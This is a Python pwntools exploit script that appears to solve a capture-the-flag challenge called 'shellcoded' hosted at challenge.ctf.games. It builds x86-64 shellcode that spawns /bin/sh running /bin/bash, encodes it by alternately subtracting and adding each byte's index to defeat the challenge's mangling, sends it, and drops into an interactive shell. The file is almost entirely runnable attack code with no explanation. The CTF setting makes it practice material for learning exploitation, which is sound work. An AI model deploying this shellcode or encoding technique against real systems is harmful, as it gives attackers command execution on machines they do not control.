#!/usr/bin/env python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './shellcoded'
host = 'challenge.ctf.games'
port = 32383

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a\x00\x00"
buf += b"\x00\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x56\x57"
buf += b"\x54\x5e\x6a\x3b\x58\x0f\x05"

sc_list = list(buf)

mangled = []

for i in range(len(sc_list)):
    if i % 2 == 0:
        mangled.append((sc_list[i] - i) % 256)
    else:
        mangled.append((sc_list[i] + i) % 256)

io.sendlineafter('Enter your shellcode.\n', bytes(mangled))

io.interactive()

